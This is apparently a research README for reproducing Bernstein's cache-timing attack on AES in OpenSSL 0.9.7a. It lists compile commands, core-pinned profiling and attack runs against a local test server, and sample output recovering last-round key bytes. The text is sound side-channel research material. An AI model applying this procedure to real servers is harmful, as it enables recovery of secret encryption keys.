
NOTES:
	** exampleCorrelationResult.txt is the correlation result of the ../data/attack.dat and 
	../data/study.dat. The last round secret key used in the attack phase is lastRoundKey.txt

	** All the codes in the folders should be compiled with the OpenSSL 0.9.7a Feb 19 2003 
	version.
								
RUNNING THE LAST ROUND ATTACK

** Compile the source codes
** During compilitaion explicitly show the openssl library to the compiler.

	% gcc -O3 -Wall server.c -o server -I /usr/local/include/openssl -L /usr/local/lib/ -lcrypto -lm
	% gcc -O3 -Wall study.c -o study -lm
	% gcc -O3 -Wall correlate.c -o correlate -lm

** Set the ASLR(Address space layout randomization) flag to 0 or 1.
				
** Generate the keys in the same way as Bernstein did.
	
	% dd if=/dev/urandom of=secretkey bs=16 count=1

Below is a step by step attack execution. The attack is executed in the same CPU but in different cores.

	In the profiling phase, we run the server with a known key
	% taskset -c 0 ./server 127.0.0.1 < /dev/zero &
	-- Server started in core 0
	-- Server listens the local host (127.0.0.1)
	-- Server started with an all zero key
	
	% taskset -c 1 ./study 127.0.0.1 600 0 > study.dat &
	-- Study started in core 1
	-- Study sends requets to the local host (127.0.0.1)
	-- It sends 600 bytes long packets
	-- 0 indicates that this is profiling phase
	-- It saves the results in the study.dat file
	-- By default it stops after 2^30 requets
	
	After the profiling phase
	% taskset -c 0 ./server 127.0.0.1 < secretkey &
	-- Server started in core 0
	-- Server listens the local host (127.0.0.1)
	-- Server started with the key "secretkey"
	
	% taskset -c 1 ./study 127.0.0.1 600 1 > attack.dat &
	-- Study started in core 1
	-- Study sends requets to the local host (127.0.0.1)
	-- It sends 600 bytes long packets
	-- 1 indicates that this is attack phase
	-- It saves the results in the attack.dat file
	-- By default it stops after 2^30 requets	
	
	
	Now we have two files. We should check for the correlations
	
	% (tail -4096 attack.dat; tail -4096 study.dat) | ./correlate | sort -n -k2
	-- As a result, an output like below should appear.
	-- The below output is for the LAST ROUND AES KEY: a15b6210 69c2342f 708c92f8 b06d2c87
	

  1  0 a1
  1  1 5b
  1  2 62
  1  3 10
  1  4 69
  1  5 c2
  1  6 34
  1  7 2f
 45  8 70 73 94 59 30 61 b1 22 49 0b 00 11 6e 2d da ac 40 48 58 68 84 72 cd 32 c2 3e a0 8f 86 0f c1 9a b2 1e 53 bc 7f c4 f5 1b ec f0 4b f2 63
256  9 e5 f6 74 be c6 05 e8 b7 3c 62 94 b3 6f 4b b2 51 d9 8e 1f c2 2d 97 30 57 13 a1 2c 06 ee 92 82 d5 ab 0c 67 a5 b1 9d 59 8f 20 85 af 55 6b 9f 2f 1e 45 dd 84 77 19 c8 8b 99 34 61 d3 cd 32 d8 da e9 28 eb f0 08 f2 c0 de 7f 41 44 42 22 d0 f4 ed 1d d4 5f 26 83 ad 7d 1a dc 95 63 72 00 a9 7e 29 79 b5 3a 47 bd 36 5c d6 12 e3 9b 4f 8d 38 8a 7a 35 3e a8 01 27 58 d7 e1 54 10 4a 6c 80 91 bb 5e c5 23 65 98 16 33 ef cb 6e 5d 3d 2e c3 fc 87 ae 75 bf 90 70 8c ce f3 cc df b6 49 e6 04 ac 39 03 f5 88 ea 56 4e 0a fa 89 21 02 f8 14 ec b4 fe db 50 9e 0f a4 96 bc 24 37 78 e4 1c 0b c4 6d 31 68 11 5b 46 ba e0 6a 5a fb 07 76 c7 aa 86 e7 fd 15 b0 48 9a e2 53 43 25 69 2a 1b 81 ca 0e 93 66 73 4c 09 a6 f7 7b 52 0d b8 b9 2b 18 71 c1 4d f9 40 a2 3f 3b 64 a3 17 a7 c9 60 ff d1 9c d2 cf a0 f1 7c
  1 10 92
256 11 f8 7e 4a c9 7c f5 01 9f 58 e6 a3 c6 cb ce 66 5a ba 32 91 17 f1 3b 72 30 9d 5c 16 de 65 12 07 e5 39 8c f4 57 1b 64 40 e8 b4 77 08 ea 84 d4 69 83 d3 0e 44 7b ee 78 0f 89 d5 0c a2 c0 e7 15 a1 6d 03 1d bd 19 21 b8 6b 98 ed ca 31 e9 27 ae 70 28 0a f3 8b ac c2 62 92 eb 80 74 8e 9c 55 88 46 51 3e ef 4d 3d d8 a0 b6 d1 e4 96 dd 7a a5 fa e0 52 aa 13 dc 23 81 6c b7 fb fd c7 25 75 34 41 2e 67 5b bf 5e 85 82 d0 f7 29 cc fe c4 36 42 ff 48 a4 be 18 3f 7f fc f6 90 94 71 87 63 b2 49 4e 4c 1f b1 73 60 d7 54 e2 1c 2a db 45 cf ad 93 a7 59 24 e1 e3 86 2c 14 0d 4f 1e c3 6a 43 9b 05 bb 8a 00 c5 df 1a 53 c1 6e 56 d6 95 9a 9e d2 38 5d ab a8 99 37 50 5f b9 2d 61 da 8f 26 04 20 3a af 76 bc 68 b3 f0 b0 11 2f 10 8d 02 b5 6f f2 3c 0b 33 97 79 7d 22 c8 f9 cd a9 35 47 09 d9 2b ec 06 a6 4b
  1 12 b0
256 13 6d 7b 22 e4 ec 1a bf ea bd 09 81 b1 17 05 19 20 3b be e7 25 a6 64 9c 50 5d 63 78 30 51 39 f7 e6 88 ef 08 de 6a 5c ba 8f 65 3d 62 5a af b9 7d 94 c1 83 31 dc 40 60 2e f2 3f cd 26 28 44 92 7a 79 2d 1e 45 16 73 58 a7 7e d7 0b 2b 70 12 cf 18 f3 38 f8 24 5e a4 41 1b 75 86 fe eb 04 35 ff 98 77 32 6f 2a c7 3e 0a 52 68 2f ac 14 07 a1 95 4a 42 23 34 8e 87 66 d4 cb 85 43 fc 67 15 e8 69 0f e5 97 4b f5 fb fa 80 a9 ee 6c b2 e9 df bb a5 5f 96 49 aa 46 36 f6 06 82 a3 d6 c4 f1 7c db b3 da 6b 4f 55 21 9e b7 90 1d c9 d8 71 4d ae b8 2c d5 dd a8 03 6e 0d d2 ca ab e2 bc 7f 47 3a 61 10 37 91 ad 53 a0 c0 8b d3 f9 8c 11 74 b6 d1 ce d0 ed 1f e0 8d 01 e1 f4 9d 4e 3c c2 c5 b0 33 5b e3 27 f0 4c b5 99 59 00 9b c3 72 1c a2 0c 13 54 b4 cc 48 fd 29 76 93 d9 c6 9f 89 56 9a 0e 84 8a 02 57 c8
 31 14 2c 9e 23 a9 92 ab 20 04 57 c3 2f 91 10 f0 44 a8 03 14 1c 77 83 d5 e9 81 5c a7 ff fa d6 47 16
256 15 c8 47 5f ed 57 37 d8 5a 59 2a cb 7a 49 86 98 b2 83 db 6a 34 f5 0a a3 50 9e f8 85 cd 22 d0 ab 17 7f 3e c0 79 0d 78 6e 77 b8 72 f6 9f b3 44 c5 a8 90 6f 09 8f 95 d7 21 62 02 c1 e2 b0 fd 9b 3d b6 96 e8 4e 14 d5 f1 69 60 91 1f 3c d6 2f 74 24 67 10 8e 55 26 32 3a 6b 1a 65 41 46 73 64 00 70 bc 18 19 92 e5 ee 71 2c 0c d9 8b 81 8c e3 f0 4a 42 7b ff 3f ae 07 3b f3 1b d1 ea 5c 30 56 9a f9 04 13 a6 88 a0 1e e4 e6 c3 89 bb 1c 39 ad 52 25 31 23 20 2d 61 f7 4c 4f c6 5e d3 b5 99 0e 11 48 eb c9 01 63 e0 4d 2b df 9d dd 12 bd aa 7d 03 54 ca ba 82 fc b9 75 58 cf 0f dc d2 1d 5d 05 e7 be 5b 8d f2 de 80 43 a1 af c2 7c e1 ec 76 35 b7 da 51 94 d4 cc 8a fb a9 40 a7 e9 66 16 ac 93 2e 28 38 fa 0b c4 f4 ce 97 53 ef 27 6c 33 4b a4 a2 c7 b4 29 a5 68 7e 06 b1 45 87 fe 08 6d 36 15 9c 84 bf
		
		